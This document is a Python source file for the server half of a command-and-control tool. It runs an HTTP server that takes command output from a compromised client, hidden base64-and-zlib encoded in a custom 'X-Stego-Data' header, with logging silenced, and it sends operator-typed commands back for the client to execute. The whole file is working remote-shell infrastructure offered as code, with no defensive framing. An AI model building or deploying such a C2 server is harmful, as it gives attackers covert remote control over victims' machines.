'''
Executes on the C2 server. Runs an HTTP server that listens for requests from the client.

Assumes only one client connects.
'''

# from urllib import request, parse
from http.server import SimpleHTTPRequestHandler, HTTPServer
import base64
import zlib
import threading
import queue
import time
from utils import SERVER_IP, SERVER_PORT

WEB_DIRECTORY = 'web' # Root directory of website files.

# The input to be executed on the client machine (Queue is thread-safe)
user_inputs = queue.Queue()

class RequestHandler(SimpleHTTPRequestHandler):
    '''
    Instantiated on each HTTP request to handle the request.
    '''
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=WEB_DIRECTORY, **kwargs)
    
    def log_message(self, format, *args):
        pass # Do nothing (silences logs)

    def get_encoded_data(self):
        # Retrieve the encoded data from the HTTP header
        encoded_data = self.headers.get('X-Stego-Data')
        if encoded_data:
            # Decode the data
            compressed_bytes = base64.b64decode(encoded_data)
            # Decompress the data
            return zlib.decompress(compressed_bytes).decode('utf-8')
        else:
            return ""

    def serve_web_content(self):
        '''
        Serves an HTML page from the website.
        '''
        if self.path == '/':
            self.path = '/index.html'
        self.path = self.directory + self.path
        try:
            with open(self.path, "r") as f:
                file_content = f.read()
            self.send_response(200)
        except:
            file_content = 'File not found.'
            self.send_response(404)
        self.end_headers()
        self.wfile.write(bytes(file_content, 'utf-8'))

    def do_GET(self):
        # self.serve_web_content()
        output = self.get_encoded_data()
        # Display command output from client machine, including current working directory.
        print("\n" + output + "\n")
        # TODO: get user input
        self.send_response(200)
        self.end_headers()
        # Wait for user input
        while (user_inputs.empty()):
            time.sleep(1)
        self.wfile.write(user_inputs.get().encode())

def run_http_server():
    server_address = (SERVER_IP, SERVER_PORT)
    httpd = HTTPServer(server_address, RequestHandler)
    httpd.serve_forever()

def main():
    # Run the http server in a background thread.
    server_thread = threading.Thread(target=run_http_server)
    server_thread.daemon = True # Ensures thread ends on main program exit.
    server_thread.start()
    while(True):
        global user_inputs
        user_inputs.put(input())

if __name__ == '__main__':
    main()